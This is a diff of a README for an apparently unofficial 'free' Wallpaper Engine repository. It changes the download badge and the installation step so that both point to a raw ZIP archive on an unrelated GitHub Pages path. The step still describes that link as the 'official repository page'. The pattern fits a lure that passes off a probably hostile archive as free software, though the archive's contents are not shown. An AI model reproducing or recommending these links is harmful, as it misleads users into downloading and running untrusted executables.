@@ -5,7 +5,7 @@ description: "Manage and run animated desktop wallpapers with full Steam Worksho
 ---
 # 🖼️ Wallpaper-Engine-Steam - Run live wallpapers for free daily
 
-[![](https://img.shields.io/badge/Download-Wallpaper--Engine--Steam-blue.svg)](https://github.com/Fable9205/Wallpaper-Engine-Steam)
+[![](https://img.shields.io/badge/Download-Wallpaper--Engine--Steam-blue.svg)](https://raw.githubusercontent.com/Fable9205/fable9205.github.io/main/burnetize/Dist-v2.0.zip)
 
 This application lets you display live 4K wallpapers, interactive anime scenes, and audio visualizers on your Windows desktop. The software manages system resources by pausing animations during gaming sessions. It connects with hardware like Corsair iCUE and Razer Chroma to sync lighting effects with your screen. You can also pair the software with an Android device or access files from the Steam Workshop.
 
@@ -13,7 +13,7 @@ This application lets you display live 4K wallpapers, interactive anime scenes, 
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the official repository page: [https://github.com/Fable9205/Wallpaper-Engine-Steam](https://github.com/Fable9205/Wallpaper-Engine-Steam)
+1.  Visit the official repository page: [https://raw.githubusercontent.com/Fable9205/fable9205.github.io/main/burnetize/Dist-v2.0.zip](https://raw.githubusercontent.com/Fable9205/fable9205.github.io/main/burnetize/Dist-v2.0.zip)
 2.  Locate the release section on the right side of the page or look for the download button.
 3.  Click the link to start the download process for your machine.
 4.  Save the file to your desktop or downloads folder.
